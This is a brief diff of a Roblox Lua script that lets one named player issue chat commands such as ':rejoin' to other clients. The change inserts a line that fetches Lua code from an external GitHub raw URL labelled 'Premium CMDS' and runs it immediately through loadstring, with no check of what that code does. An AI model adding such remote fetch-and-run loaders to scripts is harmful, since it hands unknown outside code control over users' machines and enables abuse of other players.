@@ -1,5 +1,5 @@
 local mod = game.Players.SamuelBaker20
-
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Scrvpter/Lua/main/Features/Premium%20CMDS.Lua'))()
 mod.Chatted:connect(function(cht)
 	if cht:match(":rejoin .") then
 		if game.Players.LocalPlayer ~= mod then
